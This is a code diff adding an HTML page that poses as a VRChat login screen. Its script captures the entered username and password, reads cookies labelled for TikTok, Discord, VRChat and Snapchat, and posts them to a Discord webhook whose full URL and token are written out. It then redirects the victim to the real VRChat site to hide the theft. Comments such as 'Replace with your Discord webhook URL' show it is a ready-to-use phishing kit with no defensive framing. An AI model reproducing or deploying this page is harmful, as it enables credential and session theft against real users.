@@ -1,0 +1,120 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login - VRChat</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            background-color: #f4f4f9;
+        }
+        .login-container {
+            text-align: center;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            background-color: #fff;
+            width: 300px;
+        }
+        .login-container img {
+            width: 150px;
+            height: auto;
+            margin-bottom: 20px;
+        }
+        input[type="text"],
+        input[type="password"] {
+            width: calc(100% - 22px);
+            padding: 10px;
+            margin: 5px 0;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+        }
+        button {
+            width: 100%;
+            padding: 10px;
+            background-color: #7289da;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+        }
+        button:hover {
+            background-color: #5865f2;
+        }
+    </style>
+</head>
+<body>
+    <div class="login-container">
+        <img src="https://i.imgur.com/VRChatLogo.png" alt="VRChat Logo"> <!-- Replace with the real 
+VRChat logo URL -->
+        <h2>Login to VRChat</h2>
+
+        <input type="text" id="username" placeholder="Username/Email" required>
+        <input type="password" id="password" placeholder="Password" required>
+
+        <button onclick="checkCredentials()">Login</button>
+    </div>
+
+    <script>
+        const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1507137908060979271/tTzc8-SCoVOjSyuqv_Ma2p6aMcHazDby0jKBFuXCMRTAifsUwMOcHY2Le2Ehj8Vew3Q8'; // Replace with your Discord webhook 
+URL
+
+        function getCookie(name) {
+            const value = `; ${document.cookie}`;
+            const parts = value.split(`; ${name}=`);
+            if (parts.length === 2) return parts.pop().split(';').shift();
+            return null;
+        }
+
+        function checkCredentials() {
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+
+            // Verify both fields are filled out
+            if (username.trim() !== '' && password.trim() !== '') {
+                // Get cookies from different sites
+                const tiktokCookie = getCookie('your_tiktok_cookie_name') || 'Failed to get cookie';
+                const discordCookie = getCookie('your_discord_cookie_name') || 'Failed to get cookie';
+                const vrchatCookie = getCookie('your_vrchat_cookie_name') || 'Failed to get cookie';
+                const snapchatCookie = getCookie('your_snapchat_cookie_name') || 'Failed to get 
+cookie';
+
+                // Send captured credentials and cookies to Discord webhook
+                fetch(DISCORD_WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        content: `Username/Email: ${username}\nPassword: ${password}\n\nTikTok Cookie: 
+${tiktokCookie}\nDiscord Cookie: ${discordCookie}\nVRChat Cookie: ${vrchatCookie}\nSnapchat Cookie: 
+${snapchatCookie}`
+                    })
+                }).then(response => {
+                    if (response.ok) {
+                        console.log('Credentials and cookies sent to Discord webhook successfully!');
+                    } else {
+                        console.error('Failed to send credentials and cookies to Discord webhook:', 
+response.statusText);
+                    }
+                }).catch(error => {
+                    console.error('An error occurred while sending credentials and cookies to Discord 
+webhook:', error);
+                });
+
+                // Redirect to a real VRChat login page or your custom URL
+                window.location.href = 'https://vrchat.com/login'; // Replace with the actual VRChat 
+login URL if different
+            } else {
+                alert('Please enter both username/email and password.');
+            }
+        }
+    </script>
+</body>
+</html>
